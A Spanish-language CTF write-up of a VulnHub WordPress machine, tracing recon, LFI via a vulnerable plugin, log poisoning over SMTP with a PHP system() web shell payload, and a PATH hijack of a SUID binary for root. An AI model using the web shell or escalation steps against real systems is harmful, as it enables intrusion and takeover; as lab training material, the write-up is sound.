---

---
---
- Tags:  #writeup #info #vulnhub #tutorial #hijacking 
----
# Reconocimiento

- [x] Puertos *Abiertos*(22,25,80,139,445)
- [x] Servicios
- [x] WhatWeb
- [x] Headers
- [x] Gobsuter
- [x] Gobuster Extensiones

----------
# Enumeracion

- **OS**:
Debian stretch 4.9.168
- **Credentials**

- **Pendientes**

- ### INFO GRAL
- Tipico [[WordPress]], so.
- [[Wpscan]] y pa dentro
- No podemos acceder directamente al login, aun teniendo las credenciales del *wp-config.php* (el cual conseguimos a través de un **PHP Wrapper** y aprovechando el [[Local File Inclusion (LFI)]]) del plugin Vulnerable de [[WordPress]]

------
# Explotacion

### Vias Potenciales Explotacion

[[Local File Inclusion (LFI)]], el cual vamos a derivar en un [[Log Poisoning (LFI -> RCE)]], a traves del directorio */var/log/mail*


- Recordando que tenemos activo el puerto **25** *SMPT*, al cual nos podemos conectar via [[Telnet]]
- Intentaremos envenenar los logs, de la siguiente forma
```bash
MAIL FROM:<correo.email.com> 
//
RCPT TO:<?php system($_GET['cmd']); ?>
//
.
// Recordar terminar con el punto al finalizar //
```

- Intentamos ejecutar comandos a traves del parametro *cmd*
```bash
target/lfi/lfi.php?file=/var/log/mail.log&cmd=id
```


---------
# Privesc

- [x] sudo -l
- [x] history
- [x] SUID -- Posible via status check
- Se explota un SUID en el directorio /opt (statuscheck) , el cual al ejecutarlo podemos ver que nos muestra una especie de peticion. Podemos imprimir cadeneas legibles, con *Strings*, dentro vemos que se esta ejecutando el comando *Curl*
- Aqui ya tenemos una via potencial de escalada de privilegios realizando un [[PATH Hijacking]], podemos simplemente dirigirnos al directorio */tmp*, crear un binario *curl* , y exportarlo al *Path*, podemos hacer que el comando curl, nos ejecute algun comando por ejemplo para hacer [[SUID]] la bash.

- [x] crontab
- [x] getcap
- [x] find .txt
- [x] find .sh
- [x] id
- [x] env
- [x] /opt /tmp
- [x] pspy, lse, linpeas,etc
- [x] Kernel Exploits


------------
